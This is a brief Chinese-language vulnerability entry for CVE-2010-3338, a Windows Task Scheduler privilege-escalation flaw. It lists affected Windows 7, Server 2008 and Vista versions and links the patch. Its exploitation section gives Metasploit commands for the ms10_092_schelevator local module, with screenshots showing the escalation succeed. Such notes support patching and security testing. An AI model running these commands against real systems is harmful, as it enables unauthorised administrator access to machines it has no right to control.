### CVE-2010-3338

#### 描述

Windows Task Scheduler无法正确确定计划任务的安全上下文，这使本地用户可以通过精心设计的应用程序获取特权

#### 影响版本

| Product             | Version | Update | Edition | Tested |
| ------------------- | ------- | ------ | ------- | ------ |
| Windows 7           | -       |        |         |        |
| Windows Server 2008 | -       | SP2    | Itanium |        |
| Windows Server 2008 |         |        | X64     |        |
| Windows Server 2008 |         | SP2    | X32     |        |
| Windows Server 2008 |         | SP2    | X64     |        |
| Windows Server 2008 |         |        | Itanium |        |
| Windows Server 2008 |         |        | X32     |        |
| Windows Server 2008 | R2      |        | X64     |        |
| Windows Server 2008 | R2      |        | Itanium |        |
| Windows Vista       |         | SP1    |         |        |
| Windows Vista       |         | SP1    | X64     |        |
| Windows Vista       |         | SP2    |         |        |
| Windows Vista       |         | SP2    | X64     |        |

#### 修复补丁

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2010-3338
```

#### 利用方式

测试系统 windows server 2008 sp2 x86，利用msf执行如下命令即可，x64版本msf不支持

```
use exploit/windows/local/ms10_092_schelevator
set SESSION 2
run
```

![image-20200822234422637](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2010-3338_win2008_x86_msf.png?raw=true)

然后就能提权成功了

![image-20200822234608009](https://github.com/Ascotbe/Random-img/blob/master/WindowsKernelExploits/CVE-2010-3338_win2008_x86_msf2.png?raw=true)

